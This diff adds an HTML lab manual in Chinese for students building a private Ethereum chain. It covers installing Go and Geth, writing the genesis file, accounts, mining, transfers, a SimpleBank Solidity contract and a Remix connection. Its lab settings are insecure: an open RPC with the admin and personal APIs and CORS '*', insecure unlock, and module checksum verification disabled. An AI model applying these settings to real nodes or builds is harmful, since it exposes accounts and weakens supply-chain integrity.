@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>新版区块链技术及应用 · Ethereum 实验指导手册（网页版）</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<style>
+  :root{
+    --bg:#f7f8fa; --panel:#ffffff; --ink:#1f2328; --muted:#6b7280;
+    --line:#e5e7eb; --brand:#2563eb; --brand-soft:#eff4ff;
+    --ok:#0f9d58; --ok-bg:#e8f6ee; --err:#d93025; --err-bg:#fdecea;
+    --warn:#b45309; --warn-bg:#fef3e2; --code-bg:#f6f8fa;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+    background:var(--bg); color:var(--ink); line-height:1.75; font-size:15px;
+  }
+  a{color:var(--brand);text-decoration:none}
+  a:hover{text-decoration:underline}
+
+  /* 布局 */
+  .layout{display:flex;min-height:100vh}
+  nav.sidebar{
+    width:300px; flex:0 0 300px; background:var(--panel); border-right:1px solid var(--line);
+    position:sticky; top:0; align-self:flex-start; height:100vh; overflow-y:auto; padding:18px 14px;
+  }
+  nav.sidebar .brand{font-weight:800;font-size:16px;margin-bottom:2px}
+  nav.sidebar .sub{color:var(--muted);font-size:12px;margin-bottom:14px}
+  nav.sidebar input#navSearch{
+    width:100%;padding:7px 10px;border:1px solid var(--line);border-radius:8px;margin-bottom:12px;font-size:13px;
+  }
+  nav.sidebar ol{list-style:none;margin:0;padding:0}
+  nav.sidebar ol > li{margin:2px 0}
+  nav.sidebar .exp>a{
+    display:block;padding:8px 10px;border-radius:8px;font-weight:700;color:var(--ink);
+  }
+  nav.sidebar .exp>a:hover{background:var(--brand-soft);text-decoration:none}
+  nav.sidebar ol.sub{margin:0 0 6px 10px;border-left:2px solid var(--line);padding-left:8px}
+  nav.sidebar ol.sub li a{display:block;padding:4px 8px;border-radius:6px;color:var(--muted);font-size:13px}
+  nav.sidebar ol.sub li a:hover{background:var(--brand-soft);color:var(--brand);text-decoration:none}
+  nav.sidebar ol.sub li a.active{background:var(--brand);color:#fff}
+
+  main{flex:1;min-width:0;padding:32px 40px 80px;max-width:980px}
+  main h1.doc-title{font-size:26px;margin:0 0 4px}
+  main .doc-meta{color:var(--muted);font-size:13px;margin-bottom:24px}
+
+  section.exp{padding-top:14px;margin-bottom:10px}
+  h2.exp-h{font-size:22px;border-bottom:2px solid var(--brand);padding-bottom:6px;margin-top:34px}
+  h3.sub-h{font-size:18px;margin-top:26px;color:#111827}
+  h4{font-size:15px;margin-top:18px;color:#374151}
+
+  p{margin:10px 0}
+  ul,ol{margin:10px 0 10px 22px;padding:0}
+  li{margin:4px 0}
+
+  /* 代码块 */
+  pre.code{
+    background:var(--code-bg);border:1px solid var(--line);border-radius:10px;
+    padding:14px 16px;overflow:auto;position:relative;margin:12px 0;font-size:13.5px;line-height:1.6;
+  }
+  pre.code code{font-family:"SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;white-space:pre}
+  .code-lang{
+    position:absolute;top:0;right:0;background:var(--brand);color:#fff;font-size:11px;
+    padding:2px 10px;border-bottom-left-radius:8px;border-top-right-radius:8px;letter-spacing:.5px;
+  }
+  .copy-btn{
+    position:absolute;bottom:8px;right:8px;background:#fff;border:1px solid var(--line);
+    color:var(--muted);font-size:12px;padding:3px 9px;border-radius:6px;cursor:pointer;opacity:0;transition:.15s;
+  }
+  pre.code:hover .copy-btn{opacity:1}
+  .copy-btn:hover{color:var(--brand);border-color:var(--brand)}
+
+  /* 卡片 */
+  .card{border-radius:10px;padding:12px 16px;margin:14px 0;border:1px solid}
+  .card .card-h{font-weight:800;display:flex;align-items:center;gap:8px;margin-bottom:6px}
+  .card.expected{background:var(--ok-bg);border-color:#b7e4c7}
+  .card.expected .card-h{color:var(--ok)}
+  .card.error{background:var(--err-bg);border-color:#f5c6c2}
+  .card.error .card-h{color:var(--err)}
+  .card.principle{background:var(--brand-soft);border-color:#c7d7ff}
+  .card.principle .card-h{color:var(--brand)}
+  .card.note{background:var(--warn-bg);border-color:#fcd9a8}
+  .card.note .card-h{color:var(--warn)}
+  .card p{margin:6px 0}
+  .card ul,.card ol{margin:6px 0 6px 20px}
+
+  table.tbl{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+  table.tbl th,table.tbl td{border:1px solid var(--line);padding:8px 10px;text-align:left;vertical-align:top}
+  table.tbl th{background:var(--brand-soft);color:#1e3a8a}
+  table.tbl tr:nth-child(even) td{background:#fafbfc}
+
+  .step{background:#fff;border:1px solid var(--line);border-left:4px solid var(--brand);
+    border-radius:8px;padding:12px 16px;margin:14px 0}
+  .step .step-no{display:inline-block;background:var(--brand);color:#fff;font-weight:800;
+    border-radius:6px;padding:1px 9px;margin-right:8px;font-size:13px}
+  .step .step-title{font-weight:800}
+
+  .toc-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px 18px;margin:10px 0}
+  .toc-grid a{display:block;padding:8px 12px;background:#fff;border:1px solid var(--line);border-radius:8px}
+  .toc-grid a:hover{background:var(--brand-soft);text-decoration:none}
+
+  .backtop{position:fixed;right:22px;bottom:22px;background:var(--brand);color:#fff;border:none;
+    border-radius:50%;width:42px;height:42px;font-size:18px;cursor:pointer;box-shadow:0 2px 8px rgba(0,0,0,.2)}
+  @media (max-width:880px){
+    nav.sidebar{position:static;width:100%;height:auto;border-right:none;border-bottom:1px solid var(--line)}
+    .layout{flex-direction:column}
+    main{padding:20px}
+  }
+</style>
+</head>
+<body>
+<div class="layout">
+  <!-- ============ 侧边目录 ============ -->
+  <nav class="sidebar">
+    <div class="brand">Ethereum 实验指导手册</div>
+    <div class="sub">区块链技术与应用 · 网页版 · 含锚点/代码高亮</div>
+    <input id="navSearch" placeholder="🔍 搜索章节…" oninput="filterNav(this.value)">
+    <ol id="navRoot">
+      <li class="exp"><a href="#overview">实验总览与前置说明</a>
+        <ol class="sub">
+          <li><a href="#ov-env">软件与版本清单</a></li>
+          <li><a href="#ov-dir">目录与约定</a></li>
+          <li><a href="#ov-flow">实验流程总览</a></li>
+        </ol>
+      </li>
+      <li class="exp"><a href="#exp1">实验一 开发环境搭建</a>
+        <ol class="sub">
+          <li><a href="#e1-go">安装 Go</a></li>
+          <li><a href="#e1-geth">编译 Geth 源码</a></li>
+          <li><a href="#e1-verify">验证工具链</a></li>
+        </ol>
+      </li>
+      <li class="exp"><a href="#exp2">实验二 搭建私有链</a>
+        <ol class="sub">
+          <li><a href="#e2-genesis">编写创世文件</a></li>
+          <li><a href="#e2-init">初始化与启动</a></li>
+          <li><a href="#e2-attach">连接控制台</a></li>
+        </ol>
+      </li>
+      <li class="exp"><a href="#exp3">实验三 账户·挖矿·转账</a>
+        <ol class="sub">
+          <li><a href="#e3-account">创建账户</a></li>
+          <li><a href="#e3-mine">设置矿工与挖矿</a></li>
+          <li><a href="#e3-tx">转账交易</a></li>
+        </ol>
+      </li>
+      <li class="exp"><a href="#exp4">实验四 合约开发部署</a>
+        <ol class="sub">
+          <li><a href="#e4-sol">Solidity 与合约示例</a></li>
+          <li><a href="#e4-remix">Remix 连接私链</a></li>
+          <li><a href="#e4-deploy">编译与部署</a></li>
+        </ol>
+      </li>
+      <li class="exp"><a href="#exp5">实验五 合约交互与事件</a>
+        <ol class="sub">
+          <li><a href="#e5-call">调用与查询</a></li>
+          <li><a href="#e5-event">事件与日志</a></li>
+        </ol>
+      </li>
+      <li class="exp"><a href="#exp6">实验六 重入漏洞安全实验</a>
+        <ol class="sub">
+          <li><a href="#e6-principle">漏洞原理</a></li>
+          <li><a href="#e6-exploit">复现攻击</a></li>
+          <li><a href="#e6-fix">防护方案</a></li>
+        </ol>
+      </li>
+      <li class="exp"><a href="#appendix">附录 常见报错速查</a></li>
+    </ol>
+  </nav>
+
+  <!-- ============ 正文 ============ -->
+  <main>
+    <h1 class="doc-title">新版区块链技术及应用 · Ethereum 实验指导手册</h1>
+    <div class="doc-meta">适配环境：WSL2 Ubuntu 22.04 · Go 1.18.1 · Geth v1.10.25 · Remix IDE（在线/本地）· Solidity 0.8.x　|　适用对象：初次接触以太坊的本科生/研究生</div>
+
+    <div class="card note">
+      <div class="card-h">⚠️ 关于本手册的假设说明</div>
+      <p>交接文档仅提供零散命令，未规定实验章节与密码。本手册按以下合理假设编写，请师生按需调整：</p>
+      <ul>
+        <li>实验拆为 6 个递进章节；账户密码统一以占位符 <code>YourPassword123</code> 表示，请<strong>自行设定并牢记</strong>。</li>
+        <li>创世文件已补全 geth 1.10.x 所需全部字段；网络 ID 取 <code>1108</code>。</li>
+        <li>合约示例基于 Solidity <code>0.8.x</code>，在 Remix 中选择对应编译器版本。</li>
+        <li>学生环境以 Ubuntu 22.04（含 WSL2）为准，文末附 Windows/macOS 差异提示。</li>
+      </ul>
+    </div>
+
+    <!-- ===== 总览 ===== -->
+    <section class="exp" id="overview">
+      <h2 class="exp-h" id="ov">实验总览与前置说明</h2>
+      <p>以太坊（Ethereum）是一个支持智能合约的公有链平台。本手册通过 6 个递进实验，带你在<strong>本地私有链</strong>上完整走通「装环境 → 建链 → 管账户/挖矿/转账 → 写合约 → 部署 → 交互 → 安全攻防」全流程，所有操作均可离线完成，不消耗真实以太币。</p>
+
+      <h3 class="sub-h" id="ov-env">1. 软件与版本清单</h3>
+      <table class="tbl">
+        <tr><th>组件</th><th>版本/说明</th><th>用途</th></tr>
+        <tr><td>操作系统</td><td>Ubuntu 22.04（推荐 WSL2）</td><td>运行节点</td></tr>
+        <tr><td>Go</td><td>go1.18.1，路径 /usr/local/go</td><td>编译 Geth</td></tr>
+        <tr><td>Geth</td><td>v1.10.25-stable（源码 ~/go-ethereum）</td><td>以太坊客户端</td></tr>
+        <tr><td>Remix IDE</td><td>https://remix.ethereum.org</td><td>合约编写/编译/部署</td></tr>
+        <tr><td>浏览器</td><td>Chrome / Edge</td><td>访问 Remix、查看区块浏览器（可选）</td></tr>
+      </table>
+
+      <h3 class="sub-h" id="ov-dir">2. 目录与约定</h3>
+      <ul>
+        <li><code>~/go-ethereum</code>：Geth 源码；编译产物 <code>~/go-ethereum/build/bin/geth</code>。</li>
+        <li><code>~/ethereum_lab</code>：实验根目录，存放 <code>genesis.json</code> 与各节点数据目录（<code>data0</code>、<code>data1</code>）。</li>
+        <li>命令提示符 <code>$</code> 表示在 Ubuntu 终端执行；<code>&gt;</code> 表示在 Geth JavaScript 控制台（geth console / attach）执行。</li>
+      </ul>
+
+      <h3 class="sub-h" id="ov-flow">3. 实验流程总览</h3>
+      <div class="toc-grid">
+        <a href="#exp1">实验一 · 开发环境搭建</a>
+        <a href="#exp2">实验二 · 搭建私有链</a>
+        <a href="#exp3">实验三 · 账户·挖矿·转账</a>
+        <a href="#exp4">实验四 · 合约开发部署</a>
+        <a href="#exp5">实验五 · 合约交互与事件</a>
+        <a href="#exp6">实验六 · 重入漏洞安全实验</a>
+      </div>
+
+      <div class="card principle">
+        <div class="card-h">💡 原理：什么是私有链（Private Chain）？</div>
+        <p>公有链（如主网以太坊）由全球节点共同维护、需要真币激励。私有链是<strong>仅由你控制的本地区块链</strong>：它通过一份自定义的「创世文件（genesis）」从零生成，出块难度极低，可瞬间挖矿获得测试币。私有链是学习、调试合约的最佳沙盒——所有操作零成本、可随意重置。</p>
+      </div>
+    </section>
+
+    <!-- ===== 实验一 ===== -->
+    <section class="exp" id="exp1">
+      <h2 class="exp-h">实验一　以太坊开发环境搭建</h2>
+
+      <h3 class="sub-h" id="e1-go">1.1 安装 Go 语言</h3>
+      <div class="card principle">
+        <div class="card-h">💡 原理：为什么需要 Go？</div>
+        <p>Geth（Go-Ethereum）是用 Go 语言编写的官方客户端之一。编译它需要 Go 工具链。Go 1.18 引入了泛型，与 Geth v1.10.25 兼容；版本过高（如 1.21+）有时会因依赖变更导致编译失败，交接环境固定为 <code>go1.18.1</code>。</p>
+      </div>
+
+      <div class="step">
+        <span class="step-no">步骤 1</span><span class="step-title">下载并解压 Go 1.18.1</span>
+        <pre class="code" data-lang="bash"><code># 进入临时目录
+cd /tmp
+# 下载 Go 1.18.1（国内可从 https://golang.google.cn/dl/ 获取）
+wget https://go.dev/dl/go1.18.1.linux-amd64.tar.gz
+# 解压到 /usr/local（会覆盖已有 go 目录）
+sudo rm -rf /usr/local/go
+sudo tar -C /usr/local -xzf go1.18.1.linux-amd64.tar.gz</code></pre>
+      </div>
+
+      <div class="step">
+        <span class="step-no">步骤 2</span><span class="step-title">配置 PATH 与环境变量</span>
+        <pre class="code" data-lang="bash"><code># 写入 ~/.bashrc（若使用 zsh 则写 ~/.zshrc）
+cat >> ~/.bashrc <<'EOF'
+export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin
+export GOPATH=$HOME/go
+export GO111MODULE=on
+EOF
+# 立即生效
+source ~/.bashrc</code></pre>
+      </div>
+
+      <div class="step">
+        <span class="step-no">步骤 3</span><span class="step-title">验证 Go 安装</span>
+        <pre class="code" data-lang="bash"><code>go version
+# 预期输出：go version go1.18.1 linux/amd64</code></pre>
+      </div>
+
+      <div class="card expected">
+        <div class="card-h">✅ 预期结果</div>
+        <p>终端打印 <code>go version go1.18.1 linux/amd64</code>。若提示 <code>command not found: go</code>，说明 PATH 未生效，请重新 <code>source ~/.bashrc</code> 或检查解压路径。</p>
+      </div>
+
+      <h3 class="sub-h" id="e1-geth">1.2 编译 Geth 源码</h3>
+      <div class="card principle">
+        <div class="card-h">💡 原理：GOPROXY 与模块代理</div>
+        <p>Go 依赖通过模块代理下载。<code>proxy.golang.org</code> 在国内常因网络被阻断而报连接失败。需将代理切到国内镜像 <code>goproxy.cn</code>，否则 <code>make geth</code> 会卡在拉取依赖。</p>
+      </div>
+
+      <div class="step">
+        <span class="step-no">步骤 1</span><span class="step-title">设置国内模块代理</span>
+        <pre class="code" data-lang="bash"><code>go env -w GOPROXY=https://goproxy.cn,direct
+go env -w GOSUMDB=off
+go env GOPROXY   # 确认输出 https://goproxy.cn,direct</code></pre>
+      </div>
+
+      <div class="step">
+        <span class="step-no">步骤 2</span><span class="step-title">获取 Geth 源码并编译</span>
+        <pre class="code" data-lang="bash"><code># 若已有源码则跳过 clone
+git clone https://github.com/ethereum/go-ethereum.git ~/go-ethereum
+cd ~/go-ethereum
+git checkout v1.10.25
+# 编译 geth（结果在 build/bin/geth）
+make geth</code></pre>
+      </div>
+
+      <div class="step">
+        <span class="step-no">步骤 3</span><span class="step-title">将 geth 加入 PATH</span>
+        <pre class="code" data-lang="bash"><code>cat >> ~/.bashrc <<'EOF'
+export PATH=$PATH:$HOME/go-ethereum/build/bin
+EOF
+source ~/.bashrc
+which geth   # 应输出 $HOME/go-ethereum/build/bin/geth</code></pre>
+      </div>
+
+      <div class="card expected">
+        <div class="card-h">✅ 预期结果</div>
+        <p><code>make geth</code> 末尾出现 <code>Done building.</code>，且 <code>geth version</code> 可正常输出版本信息（含 <code>Version: 1.10.25-stable</code>）。</p>
+      </div>
+
+      <h3 class="sub-h" id="e1-verify">1.3 验证工具链</h3>
+      <pre class="code" data-lang="bash"><code>go version
+geth version
+# 两者均应正常输出版本，无报错</code></pre>
+
+      <div class="card error">
+        <div class="card-h">🛠 常见报错与排障</div>
+        <table class="tbl">
+          <tr><th>报错现象</th><th>原因</th><th>解决办法</th></tr>
+          <tr><td><code>proxy.golang.org: connection refused / i/o timeout</code></td><td>默认代理在国内不可达</td><td><code>go env -w GOPROXY=https://goproxy.cn,direct</code></td></tr>
+          <tr><td><code>geth: command not found</code></td><td>PATH 未包含 geth 路径或未 source</td><td>确认 <code>~/go-ethereum/build/bin</code> 已加入 PATH 并 <code>source ~/.bashrc</code></td></tr>
+          <tr><td><code>make: *** [geth] Error 1</code> 编译失败</td><td>Go 版本不匹配或依赖损坏</td><td>核对 <code>go version</code> 为 1.18.1；<code>make clean</code> 后重试；确认 GOPROXY 生效</td></tr>
+          <tr><td>git clone 速度极慢/失败</td><td>GitHub 访问受限</td><td>改用镜像 <code>https://github.com.cnpmjs.org/ethereum/go-ethereum.git</code> 或提前拷贝源码</td></tr>
+        </table>
+      </div>
+    </section>
+
+    <!-- ===== 实验二 ===== -->
+    <section class="exp" id="exp2">
+      <h2 class="exp-h">实验二　搭建以太坊私有链</h2>
+      <p>私有链由一份<strong>创世文件（genesis.json）</strong>定义初始状态。所有节点必须用<strong>相同的创世文件 + 相同的 networkid</strong> 才能组成同一条链。</p>
+
+      <h3 class="sub-h" id="e2-genesis">2.1 编写创世文件</h3>
+      <div class="card principle">
+        <div class="card-h">💡 原理：创世文件关键字段</div>
+        <ul>
+          <li><code>config.chainId</code>：链 ID，钱包/节点用它区分不同链（主网为 1）。私有链常取任意值，如 <code>1108</code>。</li>
+          <li><code>difficulty</code>：出块难度。设为 <code>0x1</code> 使 CPU 几乎瞬间出块，便于实验。</li>
+          <li><code>gasLimit</code>：单区块 Gas 上限，决定能容纳多少交易。私有链可设较大值 <code>0x8000000</code>。</li>
+          <li><code>alloc</code>：创世时预置余额的账户；留空则初始无人有币，需靠挖矿产出。</li>
+          <li><code>config</code> 中的各 <code>*Block</code>：启用对应以太坊分叉的区块高度，私有链通常全设为 <code>0</code>（创世即启用）。</li>
+        </ul>
+      </div>
+
+      <div class="step">
+        <span class="step-no">步骤 1</span><span class="step-title">创建实验目录与创世文件</span>
+        <pre class="code" data-lang="bash"><code>mkdir -p ~/ethereum_lab && cd ~/ethereum_lab
+nano genesis.json</code></pre>
+        <p>将以下内容写入 <code>genesis.json</code>：</p>
+        <pre class="code" data-lang="json"><code>{
+  "config": {
+    "chainId": 1108,
+    "homesteadBlock": 0,
+    "eip150Block": 0,
+    "eip155Block": 0,
+    "eip158Block": 0,
+    "byzantiumBlock": 0,
+    "constantinopleBlock": 0,
+    "petersburgBlock": 0,
+    "istanbulBlock": 0,
+    "berlinBlock": 0,
+    "londonBlock": 0
+  },
+  "nonce": "0x0",
+  "timestamp": "0x0",
+  "extraData": "0x00",
+  "gasLimit": "0x8000000",
+  "difficulty": "0x1",
+  "mixhash": "0x0000000000000000000000000000000000000000000000000000000000000000",
+  "coinbase": "0x000000000000000000000000000000000000000000",
+  "alloc": {}
+}</code></pre>
+      </div>
+
+      <h3 class="sub-h" id="e2-init">2.2 初始化与启动节点</h3>
+      <div class="step">
+        <span class="step-no">步骤 1</span><span class="step-title">用创世文件初始化数据目录</span>
+        <pre class="code" data-lang="bash"><code># data0 为节点0的数据目录
+geth --datadir data0 init genesis.json</code></pre>
+        <div class="card expected">
+          <div class="card-h">✅ 预期结果</div>
+          <p>输出 <code>Successfully wrote genesis state ...</code>，并在 <code>data0</code> 下生成 <code>geth/</code> 与 <code>keystore/</code> 子目录。</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <span class="step-no">步骤 2</span><span class="step-title">启动节点并开启 HTTP/RPC</span>
+        <pre class="code" data-lang="bash"><code>geth --datadir data0 --networkid 1108 --http \
+  --http.corsdomain "*" --http.vhosts "*" \
+  --http.api eth,net,web3,personal,admin,miner \
+  --allow-insecure-unlock \
+  console 2>>geth.log</code></pre>
+        <div class="card principle">
+          <div class="card-h">💡 原理：各启动参数</div>
+          <ul>
+            <li><code>--http</code>：开启 HTTP-RPC（默认端口 8545），Remix、脚本可通过它交互。</li>
+            <li><code>--http.api</code>：开放哪些 RPC 模块。<code>personal</code>（账户）、<code>miner</code>（挖矿）、<code>admin</code> 必须显式开启，否则 Remix/脚本无权操作。</li>
+            <li><code>--http.corsdomain "*"</code>：允许跨域，Remix 网页才能调用本地节点。</li>
+            <li><code>--allow-insecure-unlock</code>：允许通过 HTTP 解锁账户（实验方便，生产禁用）。</li>
+            <li><code>console</code>：同时进入 JS 交互控制台；<code>2>>geth.log</code> 把日志重定向，便于排障。</li>
+          </ul>
+        </div>
+        <div class="card expected">
+          <div class="card-h">✅ 预期结果</div>
+          <p>终端进入 <code>&gt;</code> 交互提示符，并出现 <code>Welcome to the Geth JavaScript console!</code> 与 <code>HTTP server started</code> 日志。节点开始尝试出块（因难度为 1，但尚无矿工，区块高度为 0）。</p>
+        </div>
+      </div>
+
+      <h3 class="sub-h" id="e2-attach">2.3 另开终端连接控制台（attach）</h3>
+      <div class="card principle">
+        <div class="card-h">💡 原理：IPC 与 RPC 两种连接方式</div>
+        <p>节点运行时会在数据目录生成 <code>geth.ipc</code>（进程间通信套接字）。<code>geth attach</code> 通过 IPC 接入<strong>同一个</strong>节点进程——你在 attach 终端输入的命令，与 console 终端作用在同一节点上。这种方式无需密码、权限最高，适合本地操作。</p>
+      </div>
+      <div class="step">
+        <span class="step-no">步骤</span><span class="step-title">新开终端执行 attach</span>
+        <pre class="code" data-lang="bash"><code>cd ~/ethereum_lab
+geth attach ipc:data0/geth.ipc</code></pre>
+        <div class="card expected">
+          <div class="card-h">✅ 预期结果</div>
+          <p>新终端也进入 <code>&gt;</code> 提示符。输入 <code>eth.blockNumber</code> 返回 <code>0</code>，<code>net.version</code> 返回 <code>"1108"</code>。</p>
+        </div>
+      </div>
+
+      <div class="card error">
+        <div class="card-h">🛠 常见报错与排障（实验二）</div>
+        <table class="tbl">
+          <tr><th>报错现象</th><th>原因</th><th>解决办法</th></tr>
+          <tr><td><code>Fatal: Failed to write genesis block: genesis mismatch ...</code></td><td>已有数据目录，但创世文件被改动</td><td>删除旧数据：<code>rm -rf data0</code>，再重新 <code>init</code></td></tr>
+          <tr><td><code>Unable to attach to geth ipc:... no such file or directory</code></td><td>节点未启动，或 ipc 路径错</td><td>先启动节点；确认路径为 <code>data0/geth.ipc</code>（geth 子目录下）</td></tr>
+          <tr><td><code>bind: address already in use</code>（端口 8545 被占用）</td><td>已有 geth 或别的程序占用</td><td><code>lsof -i:8545</code> 查进程并结束；或加 <code>--http.port 8546</code> 换端口</td></tr>
+          <tr><td>Remix 连接后无账户 / 调用报 403</td><td>缺少 CORS 或 API 未开放</td><td>启动务必带 <code>--http.corsdomain "*" --http.vhosts "*" --http.api eth,net,web3,personal,admin,miner</code></td></tr>
+        </table>
+      </div>
+    </section>
+
+    <!-- ===== 实验三 ===== -->
+    <section class="exp" id="exp3">
+      <h2 class="exp-h">实验三　账户管理、挖矿与转账</h2>
+
+      <h3 class="sub-h" id="e3-account">3.1 创建账户</h3>
+      <div class="card principle">
+        <div class="card-h">💡 原理：外部账户（EOA）</div>
+        <p>以太坊账户分两类：<strong>外部账户（EOA）</strong>由私钥控制、可发起交易；<strong>合约账户</strong>由代码控制。这里创建的是 EOA。账户地址由公钥哈希得到，密钥文件（keystore）加密保存在 <code>data0/keystore/</code>。必须记住密码——<strong>密码仅用于本地解密 keystore，丢失无法找回</strong>。</p>
+      </div>
+      <div class="step">
+        <span class="step-no">步骤</span><span class="step-title">在控制台创建两个账户</span>
+        <pre class="code" data-lang="javascript"><code>// 在 geth 控制台（> 提示符）执行
+personal.newAccount("YourPassword123")   // 账户0
+personal.newAccount("YourPassword123")   // 账户1
+eth.accounts                              // 列出全部账户地址</code></pre>
+        <div class="card expected">
+          <div class="card-h">✅ 预期结果</div>
+          <p><code>personal.newAccount</code> 返回新地址（如 <code>"0xabc...def"</code>）；<code>eth.accounts</code> 返回长度为 2 的地址数组。</p>
+        </div>
+      </div>
+
+      <h3 class="sub-h" id="e3-mine">3.2 设置矿工并挖矿</h3>
+      <div class="card principle">
+        <div class="card-h">💡 原理：挖矿与 coinbase</div>
+        <p>矿工（miner）把待确认交易打包成新区块。<code>miner.setEtherbase(addr)</code> 指定「挖矿奖励（区块奖励）」打入哪个账户，该账户即称为 <strong>coinbase</strong>。私有链难度为 1，<code>miner.start(1)</code> 用一个线程即可持续出块，账户余额随之增长。</p>
+      </div>
+      <div class="step">
+        <span class="step-no">步骤 1</span><span class="step-title">指定 coinbase 并启动挖矿</span>
+        <pre class="code" data-lang="javascript"><code>miner.setEtherbase(eth.accounts[0])
+miner.start(1)        // 启动 1 个挖矿线程
+// 等待数秒后查看
+eth.blockNumber       // 应大于 0，且持续增长
+eth.getBalance(eth.accounts[0])</code></pre>
+      </div>
+      <div class="step">
+        <span class="step-no">步骤 2</span><span class="step-title">停止挖矿</span>
+        <pre class="code" data-lang="javascript"><code>miner.stop()</code></pre>
+        <div class="card expected">
+          <div class="card-h">✅ 预期结果</div>
+          <p><code>eth.blockNumber</code> 持续增大（如达到几十/上百）；<code>eth.getBalance(eth.accounts[0])</code> 返回一个很大的数字（单位 wei，1 ETH = 10¹⁸ wei）。用 <code>web3.fromWei(bal,"ether")</code> 可换算为 ETH。</p>
+        </div>
+      </div>
+
+      <h3 class="sub-h" id="e3-tx">3.3 转账交易</h3>
+      <div class="card principle">
+        <div class="card-h">💡 原理：交易、nonce 与 Gas</div>
+        <ul>
+          <li><strong>交易（Transaction）</strong>：由 EOA 签名、改变状态的操作。转账就是一笔 value 交易。</li>
+          <li><strong>nonce</strong>：账户发出的交易序号，从 0 递增，防止重放。每笔交易 nonce 必须唯一且连续。</li>
+          <li><strong>Gas</strong>：执行交易消耗的计算资源计量；<code>gasPrice × gas</code> 为手续费，从发送方扣除。未解锁账户无法签名交易。</li>
+        </ul>
+      </div>
+      <div class="step">
+        <span class="step-no">步骤 1</span><span class="step-title">解锁发送方账户</span>
+        <pre class="code" data-lang="javascript"><code>personal.unlockAccount(eth.accounts[0], "YourPassword123", 30000)
+// 返回 true 表示解锁成功，有效期 30000 秒</code></pre>
+      </div>
+      <div class="step">
+        <span class="step-no">步骤 2</span><span class="step-title">发起转账并挖矿确认</span>
+        <pre class="code" data-lang="javascript"><code>var tx = eth.sendTransaction({
+  from: eth.accounts[0],
+  to:   eth.accounts[1],
+  value: web3.toWei(10, "ether")
+});
+console.log(tx);          // 打印交易哈希
+miner.start(1);           // 挖矿把交易打包进区块
+admin.sleep(3);           // 等待约 3 秒
+miner.stop();
+eth.getBalance(eth.accounts[1])   // 应约等于 10 ETH</code></pre>
+        <div class="card expected">
+          <div class="card-h">✅ 预期结果</div>
+          <p><code>eth.sendTransaction</code> 返回 32 字节交易哈希；打包后 <code>eth.accounts[1]</code> 余额增加约 10 ETH（因挖矿奖励也打入 coinbase=accounts[0]，accounts[1] 仅收到转账）。</p>
+        </div>
+      </div>
+
+      <div class="card error">
+        <div class="card-h">🛠 常见报错与排障（实验三）</div>
+        <table class="tbl">
+          <tr><th>报错现象</th><th>原因</th><th>解决办法</th></tr>
+          <tr><td><code>could not decrypt key with given password</code></td><td>密码错误</td><td>确认使用创建账户时的密码；密码区分大小写</td></tr>
+          <tr><td><code>account is locked</code></td><td>账户未解锁或已过期</td><td>重新 <code>personal.unlockAccount(acc, pw, 30000)</code></td></tr>
+          <tr><td><code>insufficient funds for gas * price + value</code></td><td>发送方余额不足</td><td>先挖矿给 accounts[0] 充值；确认转账额 ≤ 余额</td></tr>
+          <tr><td>交易发出后余额不变</td><td>交易未被打包（未挖矿）</td><td>转账后执行 <code>miner.start(1)</code> 出块确认</td></tr>
+          <tr><td><code>nonce too low</code></td><td>nonce 重复/错乱</td><td>用 <code>eth.getTransactionCount(acc)</code> 查正确 nonce 并显式指定</td></tr>
+        </table>
+      </div>
+    </section>
+
+    <!-- ===== 实验四 ===== -->
+    <section class="exp" id="exp4">
+      <h2 class="exp-h">实验四　智能合约开发与部署</h2>
+
+      <h3 class="sub-h" id="e4-sol">4.1 Solidity 与示例合约</h3>
+      <div class="card principle">
+        <div class="card-h">💡 原理：智能合约与 EVM</div>
+        <p>智能合约是部署在链上的程序，由 <strong>Solidity</strong> 编写、编译为 <strong>EVM 字节码</strong>。合约有<strong>状态变量</strong>（持久化在链上）、<strong>函数</strong>（读/写状态）、<strong>事件</strong>（供链下监听的日志）。部署合约本质是一笔「to 为空、data 为字节码」的特殊交易，由 EVM 执行后生成合约账户。</p>
+      </div>
+      <div class="step">
+        <span class="step-no">步骤 1</span><span class="step-title">编写示例合约 SimpleBank（存取款）</span>
+        <pre class="code" data-lang="solidity"><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract SimpleBank {
+    mapping(address => uint) public balances;
+    address public owner;
+
+    event Deposit(address indexed who, uint amount);
+    event Withdraw(address indexed who, uint amount);
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    // 存款：向合约转入以太币
+    function deposit() public payable {
+        require(msg.value > 0, "deposit must be positive");
+        balances[msg.sender] += msg.value;
+        emit Deposit(msg.sender, msg.value);
+    }
+
+    // 取款：Checks-Effects-Interactions 顺序，先改状态再转账
+    function withdraw(uint amount) public {
+        require(balances[msg.sender] >= amount, "insufficient balance");
+        balances[msg.sender] -= amount;            // 先改状态
+        (bool ok, ) = msg.sender.call{value: amount}(""); // 再交互
+        require(ok, "transfer failed");
+        emit Withdraw(msg.sender, amount);
+    }
+
+    function getBalance() public view returns (uint) {
+        return balances[msg.sender];
+    }
+}</code></pre>
+      </div>
+
+      <h3 class="sub-h" id="e4-remix">4.2 Remix 连接私有链</h3>
+      <div class="step">
+        <span class="step-no">步骤 1</span><span class="step-title">在 Remix 配置外部 HTTP Provider</span>
+        <ol>
+          <li>打开 <a href="https://remix.ethereum.org" target="_blank" rel="noopener">https://remix.ethereum.org</a>，进入 <strong>Deploy &amp; Run Transactions</strong> 标签页。</li>
+          <li>environment 下拉选择 <strong>External Http Provider</strong>。</li>
+          <li>弹出框填入 <code>http://127.0.0.1:8545</code>（确保 geth 已按实验二参数启动）。</li>
+          <li>连接成功后，<strong>Account</strong> 列表会出现 geth 中的账户（即 eth.accounts）。</li>
+        </ol>
